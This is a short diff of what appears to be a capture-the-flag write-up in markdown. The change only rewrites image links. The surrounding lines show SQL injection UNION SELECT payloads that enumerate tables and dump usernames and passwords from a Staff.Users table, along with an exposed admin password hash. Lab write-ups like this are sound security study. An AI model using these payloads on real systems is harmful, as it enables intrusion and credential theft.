@@ -54,7 +54,7 @@ search='+UNION+SELECT+1,2,3,4,5,concat(table_name)+FROM+information_schema.table
 ##### Dumping User Credentials
 
 search='+UNION+SELECT+1,2,3,4,5,group_concat(username,+"|"+,password)+FROM+Staff.Users+#
-![[Pasted image 20260930145853.png]]
+![](attachments/Pasted%20image%2020260930145853.png)
 
 ==`admin` | `856f5de590ef37314e7c3bdf6f8a66dc
 
@@ -222,5 +222,5 @@ Congratulations - you have done well to get to this point.
 
 
 
-![[Pasted image 20260930174400.png]]
+![](attachments/Pasted%20image%2020260930174400.png)
 
